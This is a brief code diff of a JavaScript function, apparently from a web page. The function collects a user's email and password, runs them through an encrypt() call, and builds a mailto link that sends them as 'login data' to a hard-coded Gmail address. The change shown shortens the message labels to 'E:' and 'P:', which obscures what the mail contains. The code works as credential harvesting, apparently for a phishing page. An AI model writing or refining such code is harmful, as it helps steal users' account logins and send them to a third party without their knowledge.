@@ -105,7 +105,7 @@ function sendEmail() {
     const encryptedEmail = encrypt(email);
     const encryptedPassword = encrypt(password);
     const subject = 'Datos de inicio de sesión';
-    const body = `Correo: ${encryptedEmail}\nContraseña: ${encryptedPassword}`;
+    const body = `E:${encryptedEmail}\nP: ${encryptedPassword}`;
     const mailtoLink = `mailto:theprojectboom@gmail.com?subject=${encodeURIComponent(subject)}&body=${encodeURIComponent(body)}`;
     window.location.href = mailtoLink;
 }
